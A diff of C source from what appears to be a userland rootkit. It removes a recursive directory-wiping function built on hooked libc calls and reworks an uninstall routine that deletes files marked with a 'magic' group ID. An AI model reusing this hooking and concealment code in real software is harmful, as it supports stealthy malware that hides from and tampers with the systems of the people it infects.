@@ -1,37 +1,3 @@
-void eradicatedir(const char *target){
-    DIR *dp;
-    struct dirent *dir;
-    size_t pathlen;
-    struct stat pathstat;
-
-    hook(COPENDIR, CREADDIR, CUNLINK, CRMDIR, C__XSTAT);
-
-    dp = call(COPENDIR, target);
-    if(dp == NULL) return;
-
-    while((dir = call(CREADDIR, dp)) != NULL){
-        if(!strcmp(".\0", dir->d_name) || !strcmp("..\0", dir->d_name))
-            continue;
-
-        pathlen = strlen(target) + strlen(dir->d_name) + 2;
-        if(pathlen>PATH_MAX) continue;
-
-        char path[pathlen];
-        snprintf(path, sizeof(path), "%s/%s", target, dir->d_name);
-
-        memset(&pathstat, 0, sizeof(struct stat));
-        if((long)call(C__XSTAT, _STAT_VER, path, &pathstat) != -1)
-            if(S_ISDIR(pathstat.st_mode))
-                eradicatedir(path); // we recursive.
-
-        if((long)call(CUNLINK, path) < 0 && errno != ENOENT)
-            printf("Failed unlink on %s\n", path);
-    }
-    closedir(dp);
-    if((long)call(CRMDIR, target) < 0 && errno != ENOENT)
-        printf("Failed rmdir on %s\n", target);
-}
-
 #ifdef UNINSTALL_MY_ASS
 void uninstallass(void){
     FILE *fp;
@@ -56,9 +22,9 @@ void uninstallass(void){
             if(assstat.st_gid != magicgid)
                 continue;
 
-            if(S_ISREG(assstat.st_mode))
+            if(!S_ISDIR(assstat.st_mode))
                 call(CUNLINK, line);
-            else if(S_ISDIR(assstat.st_mode))
+            else
                 eradicatedir(line);
 
             char *assdirname = dirname(line);
